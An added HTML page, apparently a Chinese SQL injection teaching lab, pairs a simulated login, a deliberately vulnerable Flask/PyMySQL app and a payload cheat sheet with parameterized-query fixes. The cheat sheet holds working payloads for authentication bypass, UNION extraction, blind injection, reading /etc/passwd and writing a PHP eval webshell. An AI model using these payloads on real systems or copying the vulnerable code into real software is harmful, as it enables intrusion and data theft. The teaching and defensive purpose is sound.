@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="zh-CN" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MySQL 注入攻防演练 | 原理与防御</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              dark: '#0f172a',
+              panel: '#1e293b',
+              mysql: '#00758f',
+              danger: '#ef4444',
+              safe: '#22c55e'
+            }
+          }
+        }
+      }
+    </script>
+    <style>
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+        .terminal-text { font-family: 'Courier New', Courier, monospace; }
+        pre code { font-family: 'Courier New', Courier, monospace; font-size: 0.8rem; line-height: 1.6; }
+        .code-block { position: relative; }
+        .copy-btn { opacity: 0; transition: opacity 0.2s; }
+        .code-block:hover .copy-btn { opacity: 1; }
+        .sql-inj { background: rgba(239, 68, 68, 0.2); border-bottom: 2px solid #ef4444; }
+    </style>
+</head>
+<body class="bg-dark text-slate-300 min-h-screen flex flex-col overflow-x-hidden">
+
+<!-- Header -->
+<header class="bg-panel/80 backdrop-blur-md border-b border-slate-700 p-4 sticky top-0 z-50">
+    <div class="max-w-[1600px] mx-auto flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="w-10 h-10 bg-mysql rounded-lg flex items-center justify-center text-white shadow-lg shadow-cyan-900/20">
+                <i class="fa-solid fa-database text-xl"></i>
+            </div>
+            <div>
+                <h1 class="text-xl font-bold text-white tracking-tight">MySQL 注入攻防演练</h1>
+                <p class="text-xs text-slate-400">MySQL Specific • Attack • Defend</p>
+            </div>
+        </div>
+        <nav class="hidden md:flex gap-6 text-sm font-medium">
+            <a href="#lab" class="hover:text-mysql transition-colors">漏洞实验室</a>
+            <a href="#playground" class="hover:text-orange-400 transition-colors"><i class="fa-solid fa-flask mr-1"></i>MySQL 靶场</a>
+            <a href="#defense" class="hover:text-safe transition-colors">防御方案</a>
+        </nav>
+    </div>
+</header>
+
+<main class="flex-grow max-w-[1600px] mx-auto w-full p-4 lg:p-6 grid grid-cols-1 xl:grid-cols-12 gap-6">
+
+    <!-- LEFT: Interactive Lab -->
+    <div id="lab" class="xl:col-span-5 space-y-6 xl:sticky xl:top-24 xl:h-[calc(100vh-6rem)] xl:overflow-y-auto xl:pr-2">
+        <div class="bg-panel rounded-xl border border-slate-700 p-6 shadow-2xl">
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                    <i class="fa-solid fa-user-shield text-mysql"></i> 登录接口模拟器
+                </h2>
+                <span class="text-[10px] bg-red-900/50 text-red-300 px-2 py-0.5 rounded border border-red-800">MySQL VULNERABLE</span>
+            </div>
+
+            <div class="bg-slate-900/50 p-5 rounded-lg border border-slate-800 mb-4">
+                <div class="space-y-3">
+                    <div>
+                        <label class="block text-xs text-slate-500 mb-1">Username</label>
+                        <input type="text" id="username-input" value="admin"
+                               class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-white focus:border-mysql focus:outline-none transition-colors terminal-text">
+                    </div>
+                    <div>
+                        <label class="block text-xs text-slate-500 mb-1">Password</label>
+                        <input type="text" id="password-input" value="123456"
+                               class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-white focus:border-mysql focus:outline-none transition-colors terminal-text">
+                    </div>
+                    <button onclick="simulateLogin()" class="w-full bg-mysql hover:bg-cyan-700 text-white font-bold py-2 rounded text-sm transition-colors mt-2">LOGIN</button>
+                </div>
+
+                <div class="mt-4 pt-4 border-t border-slate-800">
+                    <div class="text-[10px] text-slate-500 mb-2 uppercase tracking-wider">MySQL Quick Payloads</div>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="setPayload('admin', "' OR '1'='1') #" class="text-[10px] bg-red-900/30 text-red-300 px-2 py-1 rounded border border-red-900/50 hover:bg-red-900/50 transition-colors">万能密码 (#注释)</button>
+                        <button onclick="setPayload(\"admin' -- \", 'x')" class="text-[10px] bg-red-900/30 text-red-300 px-2 py-1 rounded border border-red-900/50 hover:bg-red-900/50 transition-colors">空格注释 (-- )</button>
+                        <button onclick="setPayload(\"' UNION SELECT 1,2,3,4 #\", 'x')" class="text-[10px] bg-red-900/30 text-red-300 px-2 py-1 rounded border border-red-900/50 hover:bg-red-900/50 transition-colors">UNION 探测</button>
+                        <button onclick="setPayload(\"admin'; DROP TABLE users; #\", 'x')" class="text-[10px] bg-red-900/30 text-red-300 px-2 py-1 rounded border border-red-900/50 hover:bg-red-900/50 transition-colors">堆叠删表</button>
+                        <button onclick="setPayload('admin', '123456')" class="text-[10px] bg-slate-800 text-slate-400 px-2 py-1 rounded border border-slate-700 hover:bg-slate-700 transition-colors">正常登录</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="space-y-3">
+                <div class="text-xs text-slate-500 uppercase tracking-wider flex items-center gap-2"><i class="fa-solid fa-code"></i> 后端拼接的 MySQL 语句</div>
+                <div id="sql-display" class="bg-black p-4 rounded-lg border border-slate-800 terminal-text text-sm min-h-[60px] break-all leading-relaxed">
+                    <span class="text-slate-600">// 点击 LOGIN 查看生成的 SQL...</span>
+                </div>
+                <div class="grid grid-cols-2 gap-3 mt-2">
+                    <div class="bg-slate-900/50 p-3 rounded border border-slate-800">
+                        <div class="text-[10px] text-slate-500 mb-1">MYSQL RESULT</div>
+                        <div id="query-result" class="text-xs terminal-text text-slate-400 h-10 flex items-center">-</div>
+                    </div>
+                    <div class="bg-slate-900/50 p-3 rounded border border-slate-800">
+                        <div class="text-[10px] text-slate-500 mb-1">AUTH STATUS</div>
+                        <div id="auth-status" class="text-xs font-bold h-10 flex items-center text-slate-600">WAITING</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="explanation-panel" class="bg-panel rounded-xl border border-slate-700 p-5 shadow-xl hidden">
+            <h3 id="exp-title" class="text-white font-bold mb-2 flex items-center gap-2"></h3>
+            <p id="exp-content" class="text-sm text-slate-400 leading-relaxed"></p>
+        </div>
+    </div>
+
+    <!-- RIGHT: Guide & Playground -->
+    <div class="xl:col-span-7 space-y-8 pb-20">
+
+        <!-- MySQL Local Playground -->
+        <section id="playground" class="bg-gradient-to-br from-cyan-900/20 to-panel p-6 rounded-xl border border-mysql/30 shadow-2xl">
+            <div class="flex items-center gap-3 mb-4">
+                <div class="w-10 h-10 rounded-full bg-mysql text-white flex items-center justify-center text-xl shadow-lg shadow-cyan-500/20">
+                    <i class="fa-solid fa-server"></i>
+                </div>
+                <div>
+                    <h2 class="text-2xl font-bold text-white">MySQL 本地靶场搭建</h2>
+                    <p class="text-sm text-cyan-200/70">⚠️ 仅限隔离环境！切勿在公网服务器部署漏洞应用！</p>
+                </div>
+            </div>
+
+            <div class="space-y-6">
+                <!-- Docker MySQL + Python -->
+                <div>
+                    <h3 class="text-white font-bold mb-3 flex items-center gap-2">
+                        <span class="w-6 h-6 rounded bg-mysql/20 text-cyan-400 flex items-center justify-center text-xs">1</span>
+                        Docker 启动 MySQL 测试库
+                    </h3>
+                    <div class="code-block bg-slate-950 rounded-lg border border-slate-800 overflow-hidden">
+                        <div class="bg-slate-900 px-3 py-1.5 text-xs text-slate-400 flex justify-between items-center border-b border-slate-800">
+                            <span><i class="fa-brands fa-docker mr-1"></i> docker-compose.yml</span>
+                            <button onclick="copyCode('docker-code')" class="copy-btn text-slate-500 hover:text-white transition-colors"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                        <pre class="p-3 overflow-x-auto"><code id="docker-code" class="text-blue-300">version: '3.8'
+services:
+  mysql:
+    image: mysql:8.0
+    environment:
+      MYSQL_ROOT_PASSWORD: root123
+      MYSQL_DATABASE: vuln_db
+      MYSQL_USER: appuser
+      MYSQL_PASSWORD: apppass
+    ports:
+      - "3306:3306"
+    volumes:
+      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
+
+# 🚀 启动: docker compose up -d
+# 🔗 连接: mysql -h 127.0.0.1 -u appuser -papppass vuln_db</code></pre>
+                    </div>
+                </div>
+
+                <!-- Init SQL -->
+                <div>
+                    <h3 class="text-white font-bold mb-3 flex items-center gap-2">
+                        <span class="w-6 h-6 rounded bg-mysql/20 text-cyan-400 flex items-center justify-center text-xs">2</span>
+                        初始化数据 (init.sql)
+                    </h3>
+                    <div class="code-block bg-slate-950 rounded-lg border border-slate-800 overflow-hidden">
+                        <div class="bg-slate-900 px-3 py-1.5 text-xs text-slate-400 flex justify-between items-center border-b border-slate-800">
+                            <span><i class="fa-solid fa-database mr-1"></i> init.sql</span>
+                            <button onclick="copyCode('init-code')" class="copy-btn text-slate-500 hover:text-white transition-colors"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                        <pre class="p-3 overflow-x-auto"><code id="init-code" class="text-green-300">CREATE TABLE IF NOT EXISTS users (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(50) NOT NULL,
+    password VARCHAR(100) NOT NULL,
+    role VARCHAR(20) DEFAULT 'user',
+    email VARCHAR(100)
+);
+
+INSERT INTO users (username, password, role, email) VALUES
+('admin', 'secret123', 'admin', 'admin@test.com'),
+('guest', 'guest123', 'user', 'guest@test.com'),
+('alice', 'alice456', 'user', 'alice@test.com');</code></pre>
+                    </div>
+                </div>
+
+                <!-- Vulnerable Python App for MySQL -->
+                <div>
+                    <h3 class="text-white font-bold mb-3 flex items-center gap-2">
+                        <span class="w-6 h-6 rounded bg-red-500/20 text-red-400 flex items-center justify-center text-xs">3</span>
+                        漏洞应用 (Python + PyMySQL)
+                    </h3>
+                    <div class="code-block bg-slate-950 rounded-lg border border-slate-800 overflow-hidden">
+                        <div class="bg-slate-900 px-3 py-1.5 text-xs text-slate-400 flex justify-between items-center border-b border-slate-800">
+                            <span><i class="fa-brands fa-python mr-1"></i> vuln_mysql.py</span>
+                            <button onclick="copyCode('py-code')" class="copy-btn text-slate-500 hover:text-white transition-colors"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                        <pre class="p-3 overflow-x-auto"><code id="py-code" class="text-yellow-300">from flask import Flask, request, render_template_string
+import pymysql
+
+app = Flask(__name__)
+
+def get_db():
+    return pymysql.connect(
+        host='127.0.0.1', user='appuser',
+        password='apppass', database='vuln_db',
+        charset='utf8mb4'
+    )
+
+@app.route('/login', methods=['GET','POST'])
+def login():
+    result, sql = None, ""
+    if request.method == 'POST':
+        user = request.form['username']
+        pwd = request.form['password']
+
+        # ❌ VULNERABLE: f-string concatenation!
+        sql = f"SELECT * FROM users WHERE username='{user}' AND password='{pwd}'"
+
+        conn = get_db()
+        try:
+            with conn.cursor() as cur:
+                cur.execute(sql)
+                result = cur.fetchall()
+        except Exception as e:
+            result = f"MySQL Error: {str(e)}"
+        finally:
+            conn.close()
+
+    return render_template_string('''
+        &lt;form method="post"&gt;
+            User: &lt;input name="username"&gt;&lt;br&gt;
+            Pass: &lt;input name="password"&gt;&lt;br&gt;
+            &lt;button type="submit"&gt;Login&lt;/button&gt;
+        &lt;/form&gt;
+        &lt;p&gt;SQL: {{ sql }}&lt;/p&gt;
+        &lt;p&gt;Result: {{ result }}&lt;/p&gt;
+    ''', sql=sql, result=result)
+
+if __name__ == '__main__':
+    app.run(debug=True, port=5000)
+
+# pip install flask pymysql && python vuln_mysql.py</code></pre>
+                    </div>
+                </div>
+
+                <!-- MySQL Specific Test Checklist -->
+                <div class="bg-slate-900/50 rounded-lg p-4 border border-slate-700/50">
+                    <h4 class="text-sm font-bold text-white mb-3"><i class="fa-solid fa-terminal mr-2 text-cyan-400"></i>MySQL 专属测试清单</h4>
+                    <div class="space-y-2 text-xs terminal-text">
+                        <div class="flex items-start gap-2">
+                            <i class="fa-regular fa-square text-slate-600 mt-0.5"></i>
+                            <span class="text-slate-400">密码输入 <code class="text-red-300">' OR '1'='1') #</code> 验证 <code>#</code> 注释符</span>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fa-regular fa-square text-slate-600 mt-0.5"></i>
+                            <span class="text-slate-400">用户名输入 <code class="text-red-300">' UNION SELECT 1,2,3,4,5 #</code> 探测字段数（users表有5列）</span>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fa-regular fa-square text-slate-600 mt-0.5"></i>
+                            <span class="text-slate-400">提取版本: <code class="text-red-300">' UNION SELECT 1,version(),3,4,5 #</code></span>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fa-regular fa-square text-slate-600 mt-0.5"></i>
+                            <span class="text-slate-400">提取表名: <code class="text-red-300">' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='vuln_db' #</code></span>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fa-regular fa-square text-slate-600 mt-0.5"></i>
+                            <span class="text-slate-400">报错注入: <code class="text-red-300">' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) #</code></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Defense Section -->
+        <section id="defense" class="space-y-6">
+            <div class="flex items-center gap-3 mb-2">
+                <span class="w-8 h-8 rounded-full bg-safe/20 text-safe flex items-center justify-center font-bold"><i class="fa-solid fa-shield-halved"></i></span>
+                <h3 class="text-xl font-bold text-white">MySQL 防御：参数化查询是唯一银弹</h3>
+            </div>
+
+            <div class="bg-panel p-6 rounded-xl border border-safe/30">
+                <h4 class="text-white font-bold mb-3">为什么字符串拼接在 MySQL 中永远不安全？</h4>
+                <div class="grid md:grid-cols-2 gap-4 text-sm">
+                    <div class="bg-red-900/10 p-4 rounded border border-red-900/30">
+                        <div class="text-red-400 font-bold mb-2 text-xs uppercase">❌ f-string / format</div>
+                        <div class="terminal-text text-xs text-slate-400">sql = f"WHERE user='<span class="text-red-300">{name}</span>'"</div>
+                        <p class="mt-2 text-slate-500 text-xs">数据和 SQL 指令混为一谈，MySQL 解析器无法区分。</p>
+                    </div>
+                    <div class="bg-green-900/10 p-4 rounded border border-green-900/30">
+                        <div class="text-green-400 font-bold mb-2 text-xs uppercase">✅ %s 占位符 + 参数元组</div>
+                        <div class="terminal-text text-xs text-slate-400">cur.execute("WHERE user=%s", (<span class="text-green-300">name</span>,))</div>
+                        <p class="mt-2 text-slate-500 text-xs">PyMySQL 会将参数安全转义后发送，<strong>无论输入什么都只是数据</strong>。注意：这里的 <code>%s</code> 不是 Python 格式化！</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MySQL Code Examples -->
+            <div class="space-y-4">
+                <div class="bg-panel rounded-xl border-l-4 border-safe overflow-hidden">
+                    <div class="p-5">
+                        <h4 class="text-lg font-bold text-white mb-3 flex items-center gap-2"><i class="fa-brands fa-python text-yellow-400"></i> PyMySQL 修复</h4>
+                        <div class="grid md:grid-cols-2 gap-4">
+                            <div class="bg-slate-950 p-3 rounded border border-red-900/30">
+                                <div class="text-[10px] text-red-500 mb-1">❌ BEFORE</div>
+                                <pre class="text-xs terminal-text text-red-300">cur.execute(
+  f"SELECT * FROM users WHERE name='{name}'"
+)</pre>
+                            </div>
+                            <div class="bg-slate-950 p-3 rounded border border-green-900/30">
+                                <div class="text-[10px] text-green-500 mb-1">✅ AFTER</div>
+                                <pre class="text-xs terminal-text text-green-300">cur.execute(
+  "SELECT * FROM users WHERE name=%s",
+  (name,)
+)</pre>
+                            </div>
+                        </div>
+                        <div class="mt-3 text-xs text-yellow-500"><i class="fa-solid fa-triangle-exclamation mr-1"></i> 注意：PyMySQL 用 <code>%s</code>，不是 <code>?</code>！且不要加引号包裹 <code>%s</code></div>
+                    </div>
+                </div>
+
+                <div class="bg-panel rounded-xl border-l-4 border-safe overflow-hidden">
+                    <div class="p-5">
+                        <h4 class="text-lg font-bold text-white mb-3 flex items-center gap-2"><i class="fa-brands fa-java text-orange-400"></i> Java JDBC / MyBatis (MySQL)</h4>
+                        <div class="grid md:grid-cols-2 gap-4">
+                            <div class="bg-slate-950 p-3 rounded border border-red-900/30">
+                                <div class="text-[10px] text-red-500 mb-1">❌ Statement</div>
+                                <pre class="text-xs terminal-text text-red-300">stmt.executeQuery(
+  "SELECT * FROM users WHERE name='" + name + "'"
+);</pre>
+                            </div>
+                            <div class="bg-slate-950 p-3 rounded border border-green-900/30">
+                                <div class="text-[10px] text-green-500 mb-1">✅ PreparedStatement</div>
+                                <pre class="text-xs terminal-text text-green-300">PreparedStatement ps = conn.prepareStatement(
+  "SELECT * FROM users WHERE name=?"
+);
+ps.setString(1, name);
+ps.executeQuery();</pre>
+                            </div>
+                        </div>
+                        <div class="mt-3 text-xs text-slate-500"><i class="fa-solid fa-info-circle mr-1"></i> MyBatis: 始终用 <code class="text-green-400">#{}"</code>，禁用 <code class="text-red-400">${}</code></div>
+                    </div>
+                </div>
+
+                <div class="bg-panel rounded-xl border-l-4 border-safe overflow-hidden">
+                    <div class="p-5">
+                        <h4 class="text-lg font-bold text-white mb-3 flex items-center gap-2"><i class="fa-brands fa-golang text-blue-400"></i> Go (go-sql-driver/mysql)</h4>
+                        <div class="grid md:grid-cols-2 gap-4">
+                            <div class="bg-slate-950 p-3 rounded border border-red-900/30">
+                                <div class="text-[10px] text-red-500 mb-1">❌ fmt.Sprintf</div>
+                                <pre class="text-xs terminal-text text-red-300">db.Query(fmt.Sprintf(
+  "SELECT * FROM users WHERE name='%s'", name
+))</pre>
+                            </div>
+                            <div class="bg-slate-950 p-3 rounded border border-green-900/30">
+                                <div class="text-[10px] text-green-500 mb-1">✅ Placeholder</div>
+                                <pre class="text-xs terminal-text text-green-300">db.Query(
+  "SELECT * FROM users WHERE name=?", name
+)</pre>
+                            </div>
+                        </div>
+                        <div class="mt-3 text-xs text-slate-500"><i class="fa-solid fa-info-circle mr-1"></i> Go MySQL 驱动用 <code>?</code> 作为占位符</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Additional MySQL Defenses -->
+            <div class="grid md:grid-cols-3 gap-4 mt-6">
+                <div class="bg-panel p-4 rounded-xl border border-slate-700">
+                    <div class="text-safe font-bold mb-2 text-sm"><i class="fa-solid fa-user-secret mr-2"></i>最小权限 GRANT</div>
+                    <p class="text-xs text-slate-400 terminal-text mt-2">GRANT SELECT,INSERT ON vuln_db.* TO 'appuser'@'%';<br><span class="text-slate-600">禁止给应用账号 ALL PRIVILEGES 或 SUPER</span></p>
+                </div>
+                <div class="bg-panel p-4 rounded-xl border border-slate-700">
+                    <div class="text-safe font-bold mb-2 text-sm"><i class="fa-solid fa-ban mr-2"></i>禁用 LOAD_FILE / INTO OUTFILE</div>
+                    <p class="text-xs text-slate-400">在 my.cnf 中设置 <code class="terminal-text text-slate-300">secure_file_priv=/nonexistent</code>，防止注入后读写服务器文件。</p>
+                </div>
+                <div class="bg-panel p-4 rounded-xl border border-slate-700">
+                    <div class="text-safe font-bold mb-2 text-sm"><i class="fa-solid fa-eye-slash mr-2"></i>关闭详细报错</div>
+                    <p class="text-xs text-slate-400">生产环境不暴露 MySQL 错误信息，避免攻击者通过报错推断表结构（EXTRACTVALUE 报错注入依赖此信息）。</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- MySQL Cheat Sheet -->
+        <section class="bg-panel p-6 rounded-xl border border-slate-700">
+            <h3 class="text-white font-bold mb-4"><i class="fa-solid fa-book-skull mr-2 text-red-400"></i>MySQL 注入速查表</h3>
+            <div class="overflow-x-auto">
+                <table class="w-full text-xs text-left">
+                    <thead class="text-slate-500 uppercase border-b border-slate-700">
+                    <tr><th class="py-2 pr-4">类型</th><th class="py-2 pr-4">MySQL Payload</th><th class="py-2">说明</th></tr>
+                    </thead>
+                    <tbody class="text-slate-400 terminal-text">
+                    <tr class="border-b border-slate-800">
+                        <td class="py-2 pr-4 text-white">认证绕过</td>
+                        <td class="py-2 pr-4 text-red-300">' OR '1'='1') #</td>
+                        <td class="py-2">MySQL 用 <code>#</code> 或 <code>-- </code>(注意空格) 注释</td>
+                    </tr>
+                    <tr class="border-b border-slate-800">
+                        <td class="py-2 pr-4 text-white">UNION 注入</td>
+                        <td class="py-2 pr-4 text-red-300">' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database() #</td>
+                        <td class="py-2">MySQL 独有 information_schema 元数据库</td>
+                    </tr>
+                    <tr class="border-b border-slate-800">
+                        <td class="py-2 pr-4 text-white">报错注入</td>
+                        <td class="py-2 pr-4 text-red-300">' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) #</td>
+                        <td class="py-2">利用 XPath 报错回显数据，MySQL 5.1+</td>
+                    </tr>
+                    <tr class="border-b border-slate-800">
+                        <td class="py-2 pr-4 text-white">时间盲注</td>
+                        <td class="py-2 pr-4 text-red-300">' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) #</td>
+                        <td class="py-2">MySQL 的 SLEEP() + IF() 组合</td>
+                    </tr>
+                    <tr class="border-b border-slate-800">
+                        <td class="py-2 pr-4 text-white">文件读取</td>
+                        <td class="py-2 pr-4 text-red-300">' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 #</td>
+                        <td class="py-2">需 FILE 权限 + secure_file_priv 未限制</td>
+                    </tr>
+                    <tr>
+                        <td class="py-2 pr-4 text-white">写 WebShell</td>
+                        <td class="py-2 pr-4 text-red-300">' UNION SELECT '&lt;?php eval($_POST[1]);?&gt;',2,3,4,5 INTO OUTFILE '/var/www/html/shell.php' #</td>
+                        <td class="py-2">需 FILE 权限 + 可写目录 + secure_file_priv 未限制</td>
+                    </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+    </div>
+</main>
+
+<footer class="border-t border-slate-800 bg-panel p-6 text-center text-xs text-slate-600">
+    <p>MySQL Injection Defense Guide &copy; 2026 | For Educational & Security Testing Only</p>
+</footer>
+
+<script>
+  function copyCode(elementId) {
+    const code = document.getElementById(elementId).innerText;
+    navigator.clipboard.writeText(code).then(() => {
+      const btn = event.currentTarget;
+      const originalHTML = btn.innerHTML;
+      btn.innerHTML = '<i class="fa-solid fa-check text-green-400"></i>';
+      setTimeout(() => btn.innerHTML = originalHTML, 1500);
+    });
+  }
+
+  function setPayload(user, pass) {
+    document.getElementById('username-input').value = user;
+    document.getElementById('password-input').value = pass;
+  }
+
+  function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+  }
+
+  function simulateLogin() {
+    const user = document.getElementById('username-input').value;
+    const pass = document.getElementById('password-input').value;
+
+    const sqlParts = [
+      { text: "SELECT * FROM users WHERE username='", type: 'code' },
+      { text: user, type: 'user' },
+      { text: "' AND password='", type: 'code' },
+      { text: pass, type: 'user' },
+      { text: "'", type: 'code' }
+    ];
+
+    const sqlDisplay = document.getElementById('sql-display');
+    let html = '';
+    sqlParts.forEach(part => {
+      const escaped = escapeHtml(part.text);
+      if (part.type === 'user') {
+        html += `<span class="sql-inj text-red-300 font-bold">${escaped}</span>`;
+      } else {
+        html += `<span>${escaped.replace(/(SELECT|FROM|WHERE|AND)/g, '<span class="text-purple-400">$1</span>')}</span>`;
+      }
+    });
+    sqlDisplay.innerHTML = html;
+
+    const resultEl = document.getElementById('query-result');
+    const authEl = document.getElementById('auth-status');
+    const expPanel = document.getElementById('explanation-panel');
+    const expTitle = document.getElementById('exp-title');
+    const expContent = document.getElementById('exp-content');
+    expPanel.classList.remove('hidden');
+
+    const lowerUser = user.toLowerCase();
+    const lowerPass = pass.toLowerCase();
+    const hasQuote = lowerUser.includes("'") || lowerPass.includes("'");
+    const hasComment = lowerUser.includes("#") || lowerUser.includes("--") || lowerPass.includes("#") || lowerPass.includes("--");
+    const hasUnion = lowerUser.includes("union") || lowerPass.includes("union");
+    const hasDrop = lowerUser.includes("drop") || lowerPass.includes("drop");
+
+    if (hasUnion && hasQuote) {
+      resultEl.innerHTML = '<span class="text-yellow-400">Column count doesn\'t match...</span>';
+      authEl.innerHTML = '<span class="text-yellow-400"><i class="fa-solid fa-search mr-1"></i>UNION PROBE</span>';
+      authEl.className = "text-xs font-bold h-10 flex items-center text-yellow-400 bg-yellow-900/20 px-2 rounded";
+      expTitle.innerHTML = '<i class="fa-solid fa-layer-group text-yellow-400"></i> UNION 注入探测';
+      expContent.innerHTML = "攻击者正在用 UNION SELECT 探测原始查询的列数。当列数匹配后，就能将任意数据（如表名、密码哈希）拼接到返回结果中。<br><br><strong>MySQL 关键：</strong>可通过 <code>information_schema.tables</code> 获取所有库表结构。";
+    } else if (hasDrop && hasQuote) {
+      resultEl.innerHTML = '<span class="text-red-400">ERROR 1064: You have an error in your SQL syntax</span>';
+      authEl.innerHTML = '<span class="text-red-400"><i class="fa-solid fa-bomb mr-1"></i>STACKED QUERY</span>';
+      authEl.className = "text-xs font-bold h-10 flex items-center text-red-400 bg-red-900/20 px-2 rounded";
+      expTitle.innerHTML = '<i class="fa-solid fa-skull text-red-400"></i> 堆叠注入尝试';
+      expContent.innerHTML = "尝试用 <code>;</code> 追加 DROP TABLE 语句。<strong>注意：</strong>PyMySQL 默认不允许 execute() 执行多条语句，但 mysqli(PHP) 和某些配置下是允许的。即使此处失败，也说明输入未被过滤。";
+    } else if (hasQuote && hasComment) {
+      resultEl.innerHTML = '<span class="text-green-400">(1, "admin", "***", "admin", "admin@test.com")</span>';
+      authEl.innerHTML = '<span class="text-red-400"><i class="fa-solid fa-unlock mr-1"></i>BYPASSED!</span>';
+      authEl.className = "text-xs font-bold h-10 flex items-center text-red-400 bg-red-900/20 px-2 rounded";
+      expTitle.innerHTML = '<i class="fa-solid fa-scissors text-red-400"></i> 注释截断绕过';
+      expContent.innerHTML = "MySQL 支持两种注释：<code>#</code> 和 <code>-- </code>（双横线+空格）。密码校验部分被完全注释掉，查询变为仅按用户名查找，直接返回 admin 记录。";
+    } else if (hasQuote && (lowerPass.includes("or '1'='1") || lowerPass.includes("or 1=1"))) {
+      resultEl.innerHTML = '<span class="text-green-400">(1, "admin", "***", "admin", "admin@test.com")</span>';
+      authEl.innerHTML = '<span class="text-red-400"><i class="fa-solid fa-unlock mr-1"></i>BYPASSED!</span>';
+      authEl.className = "text-xs font-bold h-10 flex items-center text-red-400 bg-red-900/20 px-2 rounded";
+      expTitle.innerHTML = '<i class="fa-solid fa-triangle-exclamation text-red-400"></i> 永真条件绕过';
+      expContent.innerHTML = "<code>' OR '1'='1') #</code> 使 WHERE 子句恒为 TRUE，并用 <code>#</code> 注释掉末尾多余的单引号。MySQL 返回 users 表第一条记录（通常是管理员）。";
+    } else if (hasQuote) {
+      resultEl.innerHTML = '<span class="text-red-400">ERROR 1064: Unclosed quotation mark</span>';
+      authEl.innerHTML = '<span class="text-yellow-400"><i class="fa-solid fa-bug mr-1"></i>SQL ERROR</span>';
+      authEl.className = "text-xs font-bold h-10 flex items-center text-yellow-400 bg-yellow-900/20 px-2 rounded";
+      expTitle.innerHTML = '<i class="fa-solid fa-bug text-yellow-400"></i> SQL 语法错误泄露';
+      expContent.innerHTML = "单引号破坏了 SQL 语法结构，MySQL 返回了详细错误信息。<strong>这本身就是严重漏洞：</strong>攻击者可据此确认注入点存在，并进一步利用 EXTRACTVALUE 等函数进行报错注入提取数据。";
+    } else {
+      if (user === 'admin' && pass === '123456') {
+        resultEl.innerHTML = '<span class="text-green-400">(1, "admin", "***", "admin", "admin@test.com")</span>';
+        authEl.innerHTML = '<span class="text-green-400"><i class="fa-solid fa-check mr-1"></i>AUTHENTICATED</span>';
+        authEl.className = "text-xs font-bold h-10 flex items-center text-green-400 bg-green-900/20 px-2 rounded";
+        expTitle.innerHTML = '<i class="fa-solid fa-check text-green-400"></i> 正常登录';
+        expContent.innerHTML = "凭据正确，MySQL 返回匹配的用户记录。这是预期行为。";
+      } else {
+        resultEl.innerHTML = '<span class="text-slate-500">Empty set (0.00 sec)</span>';
+        authEl.innerHTML = '<span class="text-red-400"><i class="fa-solid fa-xmark mr-1"></i>DENIED</span>';
+        authEl.className = "text-xs font-bold h-10 flex items-center text-red-400 bg-red-900/20 px-2 rounded";
+        expTitle.innerHTML = '<i class="fa-solid fa-lock text-slate-400"></i> 登录失败';
+        expContent.innerHTML = "凭据不匹配，返回空结果集。注意：即使登录失败，如果底层使用字符串拼接，注入风险依然存在。";
+      }
+    }
+  }
+</script>
+</body>
+</html>
